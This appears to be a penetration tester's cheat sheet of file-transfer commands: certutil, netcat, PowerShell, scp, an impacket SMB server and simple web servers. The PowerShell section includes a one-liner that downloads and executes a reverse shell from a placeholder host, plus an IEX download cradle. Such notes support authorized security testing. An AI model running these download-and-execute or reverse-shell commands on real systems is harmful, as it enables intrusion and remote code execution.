# Methods

Copy & paste with base64 encoding.
`certutil` Download files.
`curl` Retrieve remote files.
`impacket-smbserver` Temporary SMB server.
`invoke-webrequest` PowerShell HTTP request.
`nc` Netcat file copy.
`net.webclient` PowerShell HTTP request.
`python` Temporary web server.
`scp` Remote file copy via SSH.
`wget` Retrieve remote files.

# certutil

`certutil -urlcache http://ipaddress/filename outputfilename`

# FTP

Use ASCII mode for transferring text files.
`ascii`

Use binary mode for transferring all other file types.
`binary`

# Netcat

Receiving End
`nc -lvnp port > destination_file`

Sending End
`nc -w3 destination_ip port < source_file`

# PowerShell

Download & Execute New (Stable) Revshell from Limited CMD Shell
```
start /b "" powershell -c iex (new-object net.webclient).downloadstring('http://ipaddress/file')

Notes:
start is to prevent session from locking up.
/b forces NO new window for the shell.
"" sets an empty window title.
```

Invoke Web Request
`Invoke-WebRequest "http://url/file" -OutFile "filepath\filename"`

Web Client
`IEX(new-object net.webclient).downloadstring('http://url/file')`

# SCP

Local to Remote
`scp -i id_rsa file user@remote-host:/remote/dir`

# SMB Server

```
impacket-smbserver -smb2support -username user -password pass share /local/dir

net use x: \\ipaddress\share /user:user pass
```

# Web Server

PHP
`php -S host:port`

Python
`python -m http.server port`
